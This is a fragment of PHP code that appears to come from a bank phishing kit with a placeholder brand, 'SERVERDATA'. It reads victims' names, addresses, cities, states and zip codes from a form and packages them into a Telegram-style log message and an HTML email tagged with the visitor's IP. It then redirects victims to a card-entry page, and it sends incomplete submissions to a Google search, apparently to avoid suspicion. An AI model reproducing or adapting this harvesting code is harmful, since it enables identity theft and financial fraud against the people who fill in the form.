...
$required = array('fllname', 'address');
...
if ($error) {
    header('Location: https://www.google.com/search?q=SERVERDATA+bank');
} else {
# Logs

$msgtg = "🔐 <b>SERVERDATA PERSONAL INFO</b> 🔐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

$msgtg .= "👤 <b>PERSONAL INFO</b>\n";
$msgtg .= "• Full Name  : <code>" . htmlspecialchars($_POST['fllname']) . "</code>\n";
$msgtg .= "• Address  : <code>" . htmlspecialchars($_POST['address']) . "</code>\n";
$msgtg .= "• State  : <code>" . htmlspecialchars($_POST['state']) . "</code>\n";
$msgtg .= "• City  : <code>" . htmlspecialchars($_POST['city']) . "</code>\n";
$msgtg .= "• Zip Code   : <code>" . htmlspecialchars($_POST['zipcd']) . "</code>\n\n";
...
<body>
    <div class='container'>
        <div class='header'>
            <h2>✦ SERVERDATA Personal Info ✦</h2>
        </div>
        <div class='section'>
            <h3>👤 Personal Information</h3>
            <p>Full Name: <code>" . htmlspecialchars($_POST['fllname']) . "</code></p>
            <p>Address: <code>" . htmlspecialchars($_POST['address']) . "</code></p>
            <p>State: <code>" . htmlspecialchars($_POST['state']) . "</code></p>
            <p>City: <code>" . htmlspecialchars($_POST['city']) . "</code></p>
            <p>Zip Code : <code>" . htmlspecialchars($_POST['zipcd']) . "</code></p>
        </div>
        <div class='section'>
...
if ($settings['send_mail'] == "1"){
    ...
    $subject = "✦ SERVERDATA Personal Info - {$IP} ✦";
...
header('Location: ../card.php?id=' . bin2hex(random_bytes(32)));
}
?>